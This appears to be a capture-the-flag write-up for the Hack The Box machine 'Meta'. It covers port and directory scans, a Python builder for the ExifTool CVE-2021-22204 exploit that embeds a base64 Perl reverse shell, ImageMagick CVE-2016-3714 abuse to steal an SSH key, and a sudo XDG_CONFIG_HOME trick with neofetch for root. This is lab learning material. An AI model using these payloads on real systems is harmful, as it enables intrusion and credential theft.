# Meta
## Enumeration
- Portscan 
```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 12:81:17:5a:5a:c9:c6:00:db:f0:ed:93:64:fd:1e:08 (RSA)
|   256 b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 (ECDSA)
|_  256 05:e9:df:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 (ED25519)
80/tcp open  http    Apache httpd
|_http-server-header: Apache
|_http-title: Did not follow redirect to http://artcorp.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
- Dirscan 
```bash
 kali@kali  ~/htb/meta  feroxbuster -u http://artcorp.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -q --output dirscan-artcorp.txt
200       86l      263w     4427c http://artcorp.htb/index.html
301        7l       20w      234c http://artcorp.htb/assets
301        7l       20w      238c http://artcorp.htb/assets/img
301        7l       20w      231c http://artcorp.htb/css
Scanning: http://artcorp.htb
Scanning: http://artcorp.htb/assets
Scanning: http://artcorp.htb/assets/img
Scanning: http://artcorp.htb/css
```
- The web server 'meta.htb' redirects me to 'artcorp.htb'
![[Pasted image 20220124062222.png]]
- Possible usernames 
![[Pasted image 20220124064225.png]]
- Found a virtual host
- We can upload images here, and it runs 'exiftool some-flag uploaded-image' 
## Initial access
```python
#!/bin/env python3

import base64
import subprocess

ip = '127.0.0.1'
port = '9090'

payload = b"(metadata \"\c${use MIME::Base64;eval(decode_base64('"


payload = payload + base64.b64encode( f"use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in({port},inet_aton('{ip}')))){{open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');}};".encode() )

payload = payload + b"'))};\")"


payload_file = open('payload', 'w')
payload_file.write(payload.decode('utf-8'))
payload_file.close()


subprocess.run(['bzz', 'payload', 'payload.bzz'])
subprocess.run(['djvumake', 'exploit.djvu', "INFO=1,1", 'BGjp=/dev/null', 'ANTz=payload.bzz'])
subprocess.run(['exiftool', '-config', 'configfile', '-HasselbladExif<=exploit.djvu', 'image.jpg'])
```
- Found a possible exploit
- Follow this blog to setup that exploit : https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/
- Got shell using this 
## Privilege Escalation
- There's a script /usr/local/bin/convert_images.sh

![[Pasted image 20220124074010.png]]
- UID=1000 (Thomas) is running the script /usr/local/bin/convert_images.sh
- Found a payload_builder for ImageMagick 7.0 exploit CVE-2016-3714
https://github.com/Hood3dRob1n/CVE-2016-3714.git

![[Pasted image 20220124093011.png]]
![[Pasted image 20220124093512.png]]
https://insert-script.blogspot.com/2020/

poc.svg - this payload works
- changing the echo statement to get id_rsa and store it another file gives us the ssh key for thomas
- ![[Pasted image 20220124101044.png]]
- This probably is a hint for root 
- those \"\" at the end are not allowing me to run anything after neofetch 
![[Pasted image 20220124101543.png]]
- An ever bigger hint
- there's an env_keep in /etc/sudoers, which is used to persist the environment variables while running the sudo commands, it also allows us to set a value of XDG_CONFIG_HOME
- in the screenshots above root is running a command 
```bash
/bin/sh -c cp -rp ~/conf/config_neofetch.conf /home/thomas/.config/neofetch/config.conf
```
- if we modify the value of XDG_CONFIG_HOME to say /home/thomas, it becomes
```bash
/bin/sh -c cp -rp /home/thomas/conf/config_neofetch /home/thomas/.config/neofetch/config.conf
```
- okay for some reason adding reverse shell in /home/thomas/conf/config_neofetch didn't work
> $XDG_CONFIG_HOME defines **the base directory relative to which user-specific configuration files should be stored**.
- so neofetch is using configuration files from this XDG_CONFIG_HOME directory
- if we just change this directory to /home/thomas/.config we will be able to point neofetch to thomas' config files
- that worked! 
![[Pasted image 20220124105844.png]]
I added an echo "something random" in thomas' config files so it got executed
- adding a reverse shell one liner gives me the root shell 
